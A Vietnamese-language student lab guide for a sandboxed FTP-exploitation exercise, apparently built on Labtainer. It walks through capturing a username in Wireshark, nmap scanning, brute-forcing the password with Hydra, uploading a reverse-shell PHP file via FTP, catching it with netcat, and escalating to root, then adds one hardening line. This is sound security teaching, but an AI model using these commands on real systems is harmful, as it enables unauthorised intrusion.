### Bài Thực Hành: Khai Thác Lỗ Hổng Bảo Mật FTP

#### Mục Đích:

* Giúp sinh viên hiểu được các lỗ hổng bảo mật phổ biến trong cấu hình hệ thống dịch vụ FTP.

#### Yêu Cầu Đối Với Sinh Viên:

* Có kiến thức cơ bản về hệ điều hành Linux, mô hình mạng client/server.

#### Nội Dung Bài Thực Hành:

##### 1. **Khởi Động Bài Lab**

Để khởi động bài lab, sinh viên cần gõ lệnh sau trong terminal:

```bash
labtainer troubleshooting-ftp
```

Sau khi khởi động xong, hai terminal ảo sẽ xuất hiện. Một terminal là đại diện cho máy **user** và một terminal là đại diện cho máy **server**.

##### 2. **Phân Tích Gói Tin**

Mở **Wireshark** để phân tích gói tin từ tệp **Capture.pcapng** đã có sẵn trên máy. Trên terminal **user**, gõ lệnh sau:

```bash
wireshark /etc/Capture.pcapng
```

Dùng Wireshark để tìm kiếm thông tin đăng nhập FTP, ví dụ như tên người dùng (username). Bạn sẽ tìm thấy tên người dùng là `jenny` trong gói tin này.

##### 3. **Sử Dụng Công Cụ Nmap**

Quét các cổng đang mở trên máy server để xác định dịch vụ FTP. Trên terminal **user**, gõ lệnh sau:

```bash
nmap 192.168.0.115
```

##### 4. **Sử Dụng Công Cụ Hydra**

Sử dụng công cụ **Hydra** để brute-force mật khẩu cho người dùng `jenny`. Bạn đã biết username từ bước trước, và bây giờ bạn cần tìm mật khẩu của người dùng này. Trên terminal **user**, gõ lệnh sau:

```bash
hydra -l jenny -P /etc/passwords-list.txt ftp://192.168.0.115
```

##### 5. **Tạo Backdoor**

* Đăng nhập vào dịch vụ FTP trên server:

  ```bash
  ftp 192.168.0.115
  ```

* Tải file **shell.php** từ server về máy **user**:

  ```bash
  get shell.php
  ```

* Chỉnh sửa file **shell.php** để cập nhật địa chỉ IP và cổng của máy **user**.

* Xóa file **shell.php** cũ trên server:

  ```bash
  mdelete shell.php
  ```

* Tải lại file **shell.php** đã chỉnh sửa lên server và cấp quyền truy cập:

  ```bash
  put shell.php
  chmod 777 shell.php
  ```

##### 6. **Sử Dụng Công Cụ Netcat**

Mở một cổng kết nối đến máy server bằng **Netcat**. Trên terminal **user**, gõ lệnh sau:

```bash
nc -nvlp [port]
```

Trên terminal khác, sử dụng **curl** để truy cập file **shell.php**:

```bash
curl http://192.168.0.115/shell.php
```

##### 7. **Nâng Cao Đặc Quyền**

Sau khi có được reverse shell, sử dụng Python để mở terminal bash:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Chuyển qua người dùng đã tìm được (ví dụ: `jenny`), sau đó chuyển sang root và kiểm tra quyền với lệnh `whoami`:

```bash
su jenny
sudo su
whoami
```

##### 8. **Cấu Hình Dịch Vụ FTP**

Để cải thiện bảo mật cho dịch vụ FTP, cấu hình lại tệp **vsftpd.conf** để giới hạn số lần đăng nhập sai:

```bash
echo "max_login_fails=3" >> /etc/vsftpd.conf
```

##### 9. **Kết Thúc Bài Lab**

Khi hoàn thành bài lab, sử dụng lệnh sau để kết thúc:

```bash
stoplab troubleshooting-ftp
```

Sau khi dừng bài lab, một tệp zip chứa kết quả sẽ được tạo và lưu ở vị trí được hiển thị.

##### 10. **Khởi Động Lại Bài Lab**

Nếu bạn cần thực hiện lại bài lab, sử dụng lệnh sau:

```bash
labtainer -r troubleshooting-ftp
```

---

### Lưu Ý:

* **Hydra**: Công cụ này sử dụng để brute-force mật khẩu cho dịch vụ FTP.
* **Wireshark**: Dùng để phân tích gói tin và tìm tên người dùng cũng như mật khẩu.
* **Netcat**: Mở reverse shell kết nối từ server về máy **user**.
* **Chmod 777**: Cấp quyền truy cập đầy đủ cho file `shell.php` sau khi tải lên server.
* **Python**: Sử dụng để mở shell bash từ terminal kết nối Netcat.

### Cảnh Báo:

* Đây là một bài thực hành mô phỏng các tấn công trong môi trường an toàn để sinh viên có thể học hỏi. Tuy nhiên, việc áp dụng các kỹ thuật này vào môi trường thực tế mà không có sự cho phép là vi phạm pháp luật.
